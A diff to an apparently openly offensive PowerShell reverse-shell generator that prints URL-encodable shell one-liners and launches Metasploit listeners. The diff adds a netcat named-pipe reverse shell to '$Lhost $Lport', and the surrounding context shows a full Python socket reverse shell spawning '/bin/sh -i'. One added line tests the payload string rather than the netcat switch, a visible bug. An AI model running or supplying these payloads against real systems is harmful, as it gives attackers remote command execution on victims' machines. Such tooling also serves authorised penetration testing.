@@ -1,5 +1,5 @@
 ﻿param(
-[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit
+[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit
 
 )
 
@@ -240,6 +240,10 @@ break
 
 }
 
+$r_netcat = @"
+mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc $Lhost $Lport 1>/tmp/backpipe
+"@
+
 $r_python = @"
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$Lhost",$Lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 "@
@@ -277,6 +281,7 @@ if ($php -eq $true) {$r_php = $r_php -replace " ","%20" -replace "$", "%24" -rep
 if ($ruby -eq $true) {$r_ruby =  $r_ruby -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_ruby.Length -3; $r_ruby = $r_ruby.Substring(0,$total); write-host "$r_ruby `n"}
 if ($java -eq $true) {$r_java = $r_java-replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_java.Length -3; $r_java = $r_java.Substring(0,$total); write-host "$r_java `n"}
 if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_xterm.Length -3 ; $r_xterm = $r_xterm.Substring(0,$total); write-host "$r_xterm `n"}
+if ($r_netcat -eq $true) {$r_netcat = $r_netcat -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_netcat.Length -3 ; $r_netcat = $r_netcat.Substring(0,$total); write-host "$r_netcat `n"}
 
 ################################################################################ Spawn tty shell ################################################################################
 
@@ -297,7 +302,7 @@ if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -En
 if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
-
+if ($netcat -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 }
 
 else {
@@ -306,9 +311,9 @@ Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -Fo
 
 
 
-
+if ($netcat -eq $true) {write-host $r_netcat "`n" }
 if ($python -eq $true) {write-host $r_python "`n"  }
-if ($python3 -eq $true) {write-host $r_python "`n"  }
+if ($python3 -eq $true) {$r_python = $r_python -replace "python", "python3" ;write-host $r_python "`n"  }
 if ($bash -eq $true) {write-host $r_bash "`n" }
 if ($perl -eq $true) {write-host $r_perl "`n"}
 if ($php -eq $true) {write-host $r_php  "`n"}
@@ -334,6 +339,7 @@ if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -En
 if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($netcat -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 
 }
 
